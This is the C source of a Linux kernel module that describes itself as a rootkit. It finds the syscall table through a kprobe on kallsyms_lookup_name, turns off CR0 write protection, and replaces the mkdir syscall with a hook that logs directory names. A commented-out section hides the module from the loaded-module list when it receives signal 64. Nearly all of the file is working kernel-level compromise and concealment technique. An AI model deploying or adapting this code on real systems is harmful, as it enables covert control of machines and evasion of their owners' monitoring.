#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>   //kallsyms_lookup_name
#include <asm/asm-offsets.h> // NR_syscalls, __NR_uname

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"};

unsigned long *syscall_table = NULL;
inline void mywrite_cr0(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(cr0));
}
void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}
void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);
orig_syscall_t orig_syscall;
#define SYSCALL_ID  __NR_mkdir

/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
static short hidden = 0;

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
// asmlinkage int hook_kill(const struct pt_regs *regs)
// {
//     void showme(void);
//     void hideme(void);

//     // pid_t pid = regs->di;
//     int sig = regs->si;

//     if ((sig == 64) && (hidden == 0))
//     {
//         printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
//         hideme();
//         hidden = 1;
//     }
//     else if ((sig == 64) && (hidden == 1))
//     {
//         printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
//         showme();
//         hidden = 0;
//     }

//     return orig_kill(regs);
// }

// /* Add this LKM back to the loaded module list, at the point
//  * specified by prev_module */
// void showme(void)
// {
//     list_add(&THIS_MODULE->list, prev_module);
// }

// /* Record where we are in the loaded module list by storing
//  * the module prior to us in prev_module, then remove ourselves
//  * from the list */
// void hideme(void)
// {
//     prev_module = THIS_MODULE->list.prev;
//     list_del(&THIS_MODULE->list);
// }

asmlinkage long hook_syscall(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    /* Copy the directory name from userspace (pathname, from
     * the pt_regs struct, to kernelspace (dir_name) so that we
     * can print it out to the kernel buffer */
    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n", dir_name);

    /* Pass the pt_regs struct along to the original sys_mkdir syscall */
    return orig_syscall(regs);
}

static int h_init(void)
{
    printk(KERN_ALERT "[kill_signalling.ko] initing ...\n");
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    syscall_table = kallsyms_lookup_name("sys_call_table");

    printk(KERN_ALERT "[kill_signalling.ko] syscall_table is at %lx", syscall_table);
    printk(KERN_ALERT "[kill_signalling.ko] NR_syscalls: %d", NR_syscalls);

    orig_syscall = (orig_syscall_t)syscall_table[SYSCALL_ID];
    disable_write_protection();
    syscall_table[SYSCALL_ID] = (unsigned long)hook_syscall;
    enable_write_protection();
    return 0;
}

static void h_exit(void)
{
    disable_write_protection();
    syscall_table[SYSCALL_ID] = (unsigned long)orig_syscall;
    enable_write_protection();
    printk(KERN_ALERT "[kill_signalling.ko] removing ..\n");
}

module_init(h_init);
module_exit(h_exit);
MODULE_LICENSE("GPL");